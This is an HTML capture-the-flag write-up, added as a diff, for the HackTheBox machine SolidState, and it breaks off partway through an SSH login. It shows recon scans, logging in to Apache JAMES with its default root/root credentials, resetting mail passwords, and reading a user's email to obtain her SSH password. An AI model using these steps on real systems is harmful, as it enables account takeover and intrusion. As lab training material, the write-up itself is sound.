@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox SolidState</strong></h1>
+        <em>Released: 8th September 2017 / Pwned: 8th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        SolidState has you exploit JAMES. You access the JAMES Remote Admin port using the default credentials of <code>root / root</code>, change the passwords of <code>mindy</code> and <code>john</code>, and grab mindy's SSH password by connecting to her email on port 110. Once on the box, you're in a restricted bash shell. You can escape the shell using a JAMES RCE exploit, which gets triggered when a user logs into the box. Once outside the restricted shell, you find a world-writable script owned by root in /opt/tmp.py, which is being run by root as a cronjob.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.51</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 22,25,80,110,119,4555 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.51</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-allports.txt&nbsp;10.10.10.51<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+                25<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;smtp<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                110<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;pop3<br>
+                119<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;nntp<br>
+                4555<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;rsip<br>
+                <br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;nmap&nbsp;-p&nbsp;22,25,80,110,119,4555&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>tcp-openports.txt&nbsp;10.10.10.51<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;77<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>84<span style="color:#ff9d00;font-weight:700">:</span>f5<span style="color:#ff9d00;font-weight:700">:</span>78<span style="color:#ff9d00;font-weight:700">:</span>b9<span style="color:#ff9d00;font-weight:700">:</span>c7<span style="color:#ff9d00;font-weight:700">:</span>d3<span style="color:#ff9d00;font-weight:700">:</span>54<span style="color:#ff9d00;font-weight:700">:</span>cf<span style="color:#ff9d00;font-weight:700">:</span>71<span style="color:#ff9d00;font-weight:700">:</span>2e<span style="color:#ff9d00;font-weight:700">:</span>0d<span style="color:#ff9d00;font-weight:700">:</span>52<span style="color:#ff9d00;font-weight:700">:</span>6d<span style="color:#ff9d00;font-weight:700">:</span>8b&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;78<span style="color:#ff9d00;font-weight:700">:</span>b8<span style="color:#ff9d00;font-weight:700">:</span>3a<span style="color:#ff9d00;font-weight:700">:</span>f6<span style="color:#ff9d00;font-weight:700">:</span>60<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>06<span style="color:#ff9d00;font-weight:700">:</span>91<span style="color:#ff9d00;font-weight:700">:</span>f5<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>92<span style="color:#ff9d00;font-weight:700">:</span>1d<span style="color:#ff9d00;font-weight:700">:</span>3f<span style="color:#ff9d00;font-weight:700">:</span>48<span style="color:#ff9d00;font-weight:700">:</span>ed<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;e4<span style="color:#ff9d00;font-weight:700">:</span>45<span style="color:#ff9d00;font-weight:700">:</span>e9<span style="color:#ff9d00;font-weight:700">:</span>ed<span style="color:#ff9d00;font-weight:700">:</span>07<span style="color:#ff9d00;font-weight:700">:</span>4d<span style="color:#ff9d00;font-weight:700">:</span>73<span style="color:#ff9d00;font-weight:700">:</span>69<span style="color:#ff9d00;font-weight:700">:</span>43<span style="color:#ff9d00;font-weight:700">:</span>5a<span style="color:#ff9d00;font-weight:700">:</span>12<span style="color:#ff9d00;font-weight:700">:</span>70<span style="color:#ff9d00;font-weight:700">:</span>9d<span style="color:#ff9d00;font-weight:700">:</span>c4<span style="color:#ff9d00;font-weight:700">:</span>af<span style="color:#ff9d00;font-weight:700">:</span>76&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                25<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JAMES&nbsp;smtpd&nbsp;2.3.2<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_smtp-commands<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;solidstate&nbsp;Hello&nbsp;nmap.scanme.org&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>10.10.14.15&nbsp;[10.10.14.15]<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Debian<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.25&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Debian<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Home&nbsp;-&nbsp;Solid&nbsp;State&nbsp;Security<br>
+                110<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;pop3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JAMES&nbsp;pop3d&nbsp;2.3.2<br>
+                119<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;nntp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JAMES&nbsp;nntpd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>posting&nbsp;ok<span style="color:#ff9d00;font-weight:700">)</span><br>
+                4555<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;james-admin&nbsp;JAMES&nbsp;Remote&nbsp;Admin&nbsp;2.3.2<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Scan analysis:<br>
+        • 22/ssh - Useful to know for later<br>
+        • 25/smtp + 110/pop3 - Mail is running<br>
+        • 119/nntp - Network News Protocol<br>
+        • 80/http - A website! A good place to look because websites have a huge attack vector<br>
+        • 4555/tcp - An open remote admin port... interesting<br>
+        <br>
+        I decided to look at the open remote admin port first.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 4555/tcp - JAMES Remote Admin</strong></h2><br>
+        JAMES/Apache James is an open source SMTP and POP3 mail server written in Java by the Apache Foundation.<br>
+        Nmap found a version number - 2.3.2 - so have a look for exploits.<br>
+        <br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;searchsploit&nbsp;JAMES<br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                Apache&nbsp;James&nbsp;Server&nbsp;2.2&nbsp;-&nbsp;SMTP&nbsp;Denial&nbsp;of&nbsp;Service&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>multiple<span style="color:#ff9d00;font-weight:700">/</span>dos<span style="color:#ff9d00;font-weight:700">/</span>27915.pl<br>
+                Apache&nbsp;James&nbsp;Server&nbsp;2.3.2&nbsp;-&nbsp;Remote&nbsp;Command&nbsp;Execution&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>35513.py<br>
+                WheresJames&nbsp;Webcam&nbsp;Publisher&nbsp;Beta&nbsp;2.0.0014&nbsp;-&nbsp;Remote&nbsp;Bu&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;exploits<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>944.c<br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        Remote code execution looks great.<br>
+        Copy it to a working directory of yours and read it.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;exploits<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;exploits<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">cp</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>remote<span style="color:#ff9d00;font-weight:700">/</span>35513.py&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>james.py<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;nano&nbsp;james.py
+            </div>
+        </div><br>
+        <br>
+        The exploit's RCE requires authentication.<br>
+        However, the exploit mentions that the default credentials for the JAMES Remote Admin tool are <code>root / root</code><br>
+        (you could also find this via google)<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#&nbsp;credentials&nbsp;to&nbsp;James&nbsp;Remote&nbsp;Administration&nbsp;Tool&nbsp;(Default&nbsp;-&nbsp;root/root)</span><br>
+                user&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'root'</span><br>
+                <span style="color:#ff9d00;font-weight:700">pwd</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'root'</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) Log in to Remote Admin tool</strong></h3><br>
+        Use the default credentials to log into the JAMES Remote Admin tool.<br>
+        Run <code>HELP</code> to list the available commands.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;nc&nbsp;10.10.10.51&nbsp;4555<br>
+                JAMES&nbsp;Remote&nbsp;Administration&nbsp;Tool&nbsp;2.3.2<br>
+                Please&nbsp;enter&nbsp;your&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;and&nbsp;password<br>
+                Login&nbsp;<span style="color:#ff9d00;font-weight:700">id:</span><br>
+                root<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span><br>
+                root<br>
+                Welcome&nbsp;root.&nbsp;HELP&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">a</span>&nbsp;list&nbsp;of&nbsp;commands<br>
+                HELP<br>
+                Currently&nbsp;implemented&nbsp;commands:<br>
+                help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;display&nbsp;this&nbsp;help<br>
+                listusers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;display&nbsp;existing&nbsp;accounts<br>
+                countusers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;display&nbsp;the&nbsp;number&nbsp;of&nbsp;existing&nbsp;accounts<br>
+                adduser&nbsp;[username]&nbsp;[password]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;a&nbsp;new&nbsp;user<br>
+                verify&nbsp;[username]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify&nbsp;if&nbsp;specified&nbsp;user&nbsp;exist<br>
+                deluser&nbsp;[username]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete&nbsp;existing&nbsp;user<br>
+                setpassword&nbsp;[username]&nbsp;[password]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sets&nbsp;a&nbsp;user's&nbsp;password<br>
+                setalias&nbsp;[user]&nbsp;[alias]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;locally&nbsp;forwards&nbsp;all&nbsp;email&nbsp;for&nbsp;'user'&nbsp;to&nbsp;'alias'<br>
+                showalias&nbsp;[username]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shows&nbsp;a&nbsp;user's&nbsp;current&nbsp;email&nbsp;alias<br>
+                unsetalias&nbsp;[user]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsets&nbsp;an&nbsp;alias&nbsp;for&nbsp;'user'<br>
+                setforwarding&nbsp;[username]&nbsp;[emailaddress]&nbsp;forwards&nbsp;a&nbsp;user's&nbsp;email&nbsp;to&nbsp;another&nbsp;email&nbsp;address<br>
+                showforwarding&nbsp;[username]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shows&nbsp;a&nbsp;user's&nbsp;current&nbsp;email&nbsp;forwarding<br>
+                unsetforwarding&nbsp;[username]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;removes&nbsp;a&nbsp;forward<br>
+                user&nbsp;[repositoryname]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;change&nbsp;to&nbsp;another&nbsp;user&nbsp;repository<br>
+                shutdown&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kills&nbsp;the&nbsp;current&nbsp;JVM&nbsp;(convenient&nbsp;when&nbsp;James&nbsp;is&nbsp;run&nbsp;as&nbsp;a&nbsp;daemon)<br>
+                quit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;close&nbsp;connection<br>
+                listusers<br>
+                Existing&nbsp;accounts&nbsp;5<br>
+                user:&nbsp;james<br>
+                user:&nbsp;thomas<br>
+                user:&nbsp;john<br>
+                user:&nbsp;mindy<br>
+                user:&nbsp;mailadmin
+            </div>
+        </div><br>
+        <br>
+        There are 5 users.<br>
+        We can change their password with <code>setpassword</code>.<br>
+        I changed the password for every user to “hey�, but the most important user password to change is <code>mindy</code>.<br>
+            <div class="codebox">
+                [...]<br>
+                setpassword&nbsp;mindy&nbsp;hey<br>
+                Password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">mindy</span>&nbsp;reset
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Read mindy's mail</strong></h2><br>
+        With mindy's new password, we can log into her email.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;telnet&nbsp;10.10.10.51&nbsp;110<br>
+                Trying&nbsp;10.10.10.51...<br>
+                Connected&nbsp;to&nbsp;10.10.10.51.<br>
+                Escape&nbsp;character&nbsp;is&nbsp;<span style="color:#3ad900;font-weight:400">'^]'</span>.<br>
+                +OK&nbsp;solidstate&nbsp;POP3&nbsp;server&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>JAMES&nbsp;POP3&nbsp;Server&nbsp;2.3.2<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;ready&nbsp;<br>
+                USER&nbsp;mindy<br>
+                +OK<br>
+                PASS&nbsp;hey<br>
+                +OK&nbsp;Welcome&nbsp;mindy<br>
+                LIST<br>
+                +OK&nbsp;2&nbsp;1945<br>
+                1&nbsp;1109<br>
+                2&nbsp;836<br>
+                .<br>
+                RETR&nbsp;2&nbsp;&nbsp;<br>
+                +OK&nbsp;Message&nbsp;follows<br>
+                Return-Path<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&lt;mailadmin@localhost&gt;<br>
+                Message-ID<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;<br>
+                MIME-Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1.0<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;text<span style="color:#ff9d00;font-weight:700">/</span>plain<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;charset=us-ascii<br>
+                Content-Transfer-Encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7bit<br>
+                Delivered-To<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;mindy@localhost<br>
+                Received<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;from&nbsp;192.168.11.142&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>[192.168.11.142]<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;solidstate&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>JAMES&nbsp;SMTP&nbsp;Server&nbsp;2.3.2<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;with&nbsp;SMTP&nbsp;ID&nbsp;581<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;&lt;<span style="color:#7f0044;font-weight:400">mindy</span>@localhost&gt;;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tue,&nbsp;22&nbsp;Aug&nbsp;2017&nbsp;13:17:28&nbsp;-0400&nbsp;(EDT)<br>
+                Date:&nbsp;Tue,&nbsp;22&nbsp;Aug&nbsp;2017&nbsp;13:17:28&nbsp;-0400&nbsp;(EDT)<br>
+                From:&nbsp;mailadmin@localhost<br>
+                Subject:&nbsp;Your&nbsp;Access<br>
+                <br>
+                Dear&nbsp;Mindy,<br>
+                <br>
+                Here&nbsp;are&nbsp;your&nbsp;ssh&nbsp;credentials&nbsp;to&nbsp;access&nbsp;the&nbsp;system.&nbsp;Remember&nbsp;to&nbsp;reset&nbsp;your&nbsp;password&nbsp;after&nbsp;your&nbsp;first&nbsp;login.&nbsp;<br>
+                Your&nbsp;access&nbsp;is&nbsp;restricted&nbsp;at&nbsp;the&nbsp;moment,&nbsp;feel&nbsp;free&nbsp;to&nbsp;ask&nbsp;your&nbsp;supervisor&nbsp;to&nbsp;add&nbsp;any&nbsp;commands&nbsp;you&nbsp;need&nbsp;to&nbsp;your&nbsp;path.&nbsp;<br>
+                <br>
+                username:&nbsp;mindy<br>
+                pass:&nbsp;P@55W0rd1!2@<br>
+                <br>
+                Respectfully,<br>
+                James
+            </div>
+        </div><br>
+        <br>
+        Credentials!<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) ssh</strong></h2><br>
+        Log in as mindy via ssh using the found credentials - <code>mindy / P@55W0rd1!2@</code><br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>solidstate#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;mindy@10.10.10.51<br>
+                mindy@10.10.10.51s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Linux&nbsp;solidstate&nbsp;4.9.0-3-686-pae&nbsp;<span style="color:#0088ff;font-weight:400">#1&nbsp;SMP&nbsp;Debian&nbsp;4.9.30-2+deb9u3&nbsp;(2017-08-06)&nbsp;i686</span><br>
+                <br>
+                The&nbsp;programs&nbsp;included&nbsp;with&nbsp;the&nbsp;Debian&nbsp;GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;system&nbsp;are&nbsp;<span style="color:#ff9d00;font-weight:700">free</span>&nbsp;software<span style="color:#ff9d00;font-weight:700">;</span><br>
+                the&nbsp;exact&nbsp;distribution&nbsp;terms&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">each</span>&nbsp;program&nbsp;are&nbsp;described&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the<br>
